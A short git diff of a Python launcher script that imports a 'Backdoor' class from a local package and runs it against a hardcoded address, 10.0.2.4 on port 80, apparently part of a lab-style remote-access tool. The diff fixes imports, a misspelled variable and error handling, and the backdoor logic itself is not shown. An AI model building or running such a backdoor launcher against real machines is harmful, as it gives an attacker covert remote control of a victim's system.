@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
-from Server import Backdoor
-
+from package import Server
+import sys
 # Checks if the connection on our side is alive or no if yes it will try to call the objects if not it's do nothing basiclly
-if conection:
+connection = True
+if connection:
 	try:
-	    app = Backdoor("10.0.2.4", 80)
-	    app.run()
+		app = Server.Backdoor("10.0.2.4", 80)
+		app.run()
 	except Exception as e:
-		#send_error(e)
-	    sys.exit()
-
+	        print(e)
+	        sys.exit()
 
